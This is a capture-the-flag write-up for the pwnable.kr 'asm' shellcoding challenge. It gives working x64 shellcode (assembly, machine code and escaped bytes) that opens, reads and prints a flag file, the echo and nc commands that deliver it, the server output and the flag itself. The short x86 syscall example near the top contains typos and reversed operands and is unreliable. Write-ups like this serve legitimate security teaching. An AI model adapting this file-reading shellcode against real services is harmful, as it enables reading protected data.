once you connect to port 9026, the "asm" binary will be executed under asm_pwn privilege.
make connection to challenge (nc 0 9026) then get the flag. (file name of the flag is same as the one in this directory)

Flag file name is

Working directory is /home/asm

File name is like below

this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong

-----------------------------------
seccomp - operate on Secure Computing state of the process
------------------------------

## Example code for syscall with x64 assembly
```
mov 0x05 eax
mov addr ebx
mov 0 ecx
mob 0 edx
int 0x80 # open

mob eax ebx
mov 0x400 edx
mov bufaddr ecx
mov 03 eax
int 0x80 # read

mov 04 eax
mov 1 ebx
int 0x80 # write
```

## inline assembly core

```
__asm__ volatile (

		"mov $0x00676e6f306f306f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x306f306f306f306f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x3030303030303030, %rax\r\n"
		"push %rax\r\n"
		"mov $0x303030306f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f3030303030, %rax\r\n"
		"push %rax\r\n"
		"mov $0x3030303030303030, %rax\r\n"
		"push %rax\r\n"
		"mov $0x3030303030303030, %rax\r\n"
		"push %rax\r\n"
		"mov $0x303030306f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6c5f797265765f73, %rax\r\n"
		"push %rax\r\n"
		"mov $0x695f656d616e5f65, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6c69665f6568745f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x7972726f732e656c, %rax\r\n"
		"push %rax\r\n"
		"mov $0x69665f736968745f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x646165725f657361, %rax\r\n"
		"push %rax\r\n"
		"mov $0x656c705f656c6966, %rax\r\n"
		"push %rax\r\n"
		"mov $0x5f67616c665f726b, %rax\r\n"
		"push %rax\r\n"
		"mov $0x2e656c62616e7770, %rax\r\n"
		"push %rax\r\n"
		"mov $0x5f73695f73696874, %rax\r\n"
		"push %rax\r\n"

		"mov $0x2, %rax\r\n"
		"mov %rsp, %rdi\r\n"
		"mov $0x0, %rsi\r\n"
		"mov $0x0, %rdx\r\n"
		"syscall\r\n" //open


		"mov %rax, %rdi\r\n"
		"mov %rsp, %rsi\r\n"
		"mov $0x400, %rdx\r\n"
		"mov $0x0, %rax\r\n"
		"syscall\r\n" //read

		"mov $0x1, %rax\r\n"
		"mov $0x1, %rdi\r\n"
		"mov %rsp, %rsi\r\n"
		"syscall" //write
	);
```


###	Machine code core


```
48 b8 6f 30 6f 30 6f
6e 67 00 
50                  
48 b8 6f 30 6f 30 6f
30 6f 30 
50                  
48 b8 30 30 30 30 30
30 30 30 
50                  
48 b8 6f 6f 6f 6f 30
30 30 30 
50                  
48 b8 6f 6f 6f 6f 6f
6f 6f 6f 
50                  
48 b8 6f 6f 6f 6f 6f
6f 6f 6f 
50                  
48 b8 30 30 30 30 30
6f 6f 6f 
50                  
48 b8 30 30 30 30 30
30 30 30 
50                  
48 b8 30 30 30 30 30
30 30 30 
50                  
48 b8 6f 6f 6f 6f 30
30 30 30 
50                  
48 b8 6f 6f 6f 6f 6f
6f 6f 6f 
50                  
48 b8 6f 6f 6f 6f 6f
6f 6f 6f 
50                  
48 b8 6f 6f 6f 6f 6f
6f 6f 6f 
50                  
48 b8 6f 6f 6f 6f 6f
6f 6f 6f 
50                  
48 b8 6f 6f 6f 6f 6f
6f 6f 6f 
50                  
48 b8 6f 6f 6f 6f 6f
6f 6f 6f 
50                  
48 b8 6f 6f 6f 6f 6f
6f 6f 6f 
50                  
48 b8 6f 6f 6f 6f 6f
6f 6f 6f 
50                  
48 b8 6f 6f 6f 6f 6f
6f 6f 6f 
50                  
48 b8 73 5f 76 65 72
79 5f 6c 
50                  
48 b8 65 5f 6e 61 6d
65 5f 69 
50                  
48 b8 5f 74 68 65 5f
66 69 6c 
50                  
48 b8 6c 65 2e 73 6f
72 72 79 
50                  
48 b8 5f 74 68 69 73
5f 66 69 
50                  
48 b8 61 73 65 5f 72
65 61 64 
50                  
48 b8 66 69 6c 65 5f
70 6c 65 
50                  
48 b8 6b 72 5f 66 6c
61 67 5f 
50                  
48 b8 70 77 6e 61 62
6c 65 2e 
50                  
48 b8 74 68 69 73 5f
69 73 5f 
50                  
48 c7 c0 02 00 00 00
48 89 e7            
48 c7 c6 00 00 00 00
48 c7 c2 00 00 00 00
0f 05      
48 89 c7   
48 89 e6   
48 c7 c2 00 04 00 00
48 c7 c0 00 00 00 00
0f 05               
48 c7 c0 01 00 00 00
48 c7 c7 01 00 00 00
48 89 e6            
0f 05               
```

## Shell code
```
"\x48\xb8\x6f\x30\x6f\x30\x6f\x6e\x67\x00\x50\x48\xb8\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x50\x48\xb8\x30\x30\x30\x30\x30\x30\x30\x30\x50\x48\xb8\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x30\x30\x30\x30\x30\x6f\x6f\x6f\x50\x48\xb8\x30\x30\x30\x30\x30\x30\x30\x30\x50\x48\xb8\x30\x30\x30\x30\x30\x30\x30\x30\x50\x48\xb8\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x73\x5f\x76\x65\x72\x79\x5f\x6c\x50\x48\xb8\x65\x5f\x6e\x61\x6d\x65\x5f\x69\x50\x48\xb8\x5f\x74\x68\x65\x5f\x66\x69\x6c\x50\x48\xb8\x6c\x65\x2e\x73\x6f\x72\x72\x79\x50\x48\xb8\x5f\x74\x68\x69\x73\x5f\x66\x69\x50\x48\xb8\x61\x73\x65\x5f\x72\x65\x61\x64\x50\x48\xb8\x66\x69\x6c\x65\x5f\x70\x6c\x65\x50\x48\xb8\x6b\x72\x5f\x66\x6c\x61\x67\x5f\x50\x48\xb8\x70\x77\x6e\x61\x62\x6c\x65\x2e\x50\x48\xb8\x74\x68\x69\x73\x5f\x69\x73\x5f\x50\x48\xc7\xc0\x02\x00\x00\x00\x48\x89\xe7\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\xc7\xc2\x00\x04\x00\x00\x48\xc7\xc0\x00\x00\x00\x00\x0f\x05\x48\xc7\xc0\x01\x00\x00\x00\x48\xc7\xc7\x01\x00\x00\x00\x48\x89\xe6\x0f\x05"
```

## Exploit method
First of all, connect to pwnable server, and create exploit text file in tmp directory

```
echo -e "\x48\xb8\x6f\x30\x6f\x30\x6f\x6e\x67\x00\x50\x48\xb8\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x50\x48\xb8\x30\x30\x30\x30\x30\x30\x30\x30\x50\x48\xb8\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x30\x30\x30\x30\x30\x6f\x6f\x6f\x50\x48\xb8\x30\x30\x30\x30\x30\x30\x30\x30\x50\x48\xb8\x30\x30\x30\x30\x30\x30\x30\x30\x50\x48\xb8\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x73\x5f\x76\x65\x72\x79\x5f\x6c\x50\x48\xb8\x65\x5f\x6e\x61\x6d\x65\x5f\x69\x50\x48\xb8\x5f\x74\x68\x65\x5f\x66\x69\x6c\x50\x48\xb8\x6c\x65\x2e\x73\x6f\x72\x72\x79\x50\x48\xb8\x5f\x74\x68\x69\x73\x5f\x66\x69\x50\x48\xb8\x61\x73\x65\x5f\x72\x65\x61\x64\x50\x48\xb8\x66\x69\x6c\x65\x5f\x70\x6c\x65\x50\x48\xb8\x6b\x72\x5f\x66\x6c\x61\x67\x5f\x50\x48\xb8\x70\x77\x6e\x61\x62\x6c\x65\x2e\x50\x48\xb8\x74\x68\x69\x73\x5f\x69\x73\x5f\x50\x48\xc7\xc0\x02\x00\x00\x00\x48\x89\xe7\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\xc7\xc2\x00\x04\x00\x00\x48\xc7\xc0\x00\x00\x00\x00\x0f\x05\x48\xc7\xc0\x01\x00\x00\x00\x48\xc7\xc7\x01\x00\x00\x00\x48\x89\xe6\x0f\x05" > /tmp/bobgil/shellcode.txt
```

And redirect to the 9026 port server with shellcode
```
asm@ubuntu:/tmp/bobgil$ nc 0 9026 < shellcode.txt 
Welcome to shellcoding practice challenge.
In this challenge, you can run your x64 shellcode under SECCOMP sandbox.
Try to make shellcode that spits flag using open()/read()/write() systemcalls only.
If this does not challenge you. you should play 'asg' challenge :)
give me your x64 shellcode: Mak1ng_shelLcodE_i5_veRy_eaSy
lease_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong�~U&�U8}|� {U&0}|.@AA�~U&�U0��68}|�d}U&�U�����~� {U&�U0}|����&�;+��Yf��*d}U&�U U&�U {U&�U0}|�I{U&�U(}|�\�|�n�|��|���|���|�Ř|�ؘ|���|�m�|�˞|���|���|�|��|�,�|�4�|�D�|�T�|���|���|�ğ|�!�|����d@pU&�U8	�6      {U&�U
                                                      E
EE9|���|�I|������Ìasm@ubuntu:/tmp/bobgil$     E

```

Flag is `Mak1ng_shelLcodE_i5_veRy_eaSy`

Done!

## References

#### x64 syscall calling convention

Link : [http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/](http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)    

#### x86 syscall calling convention

Link : [http://syscalls.kernelgrok.com/](http://syscalls.kernelgrok.com/)    
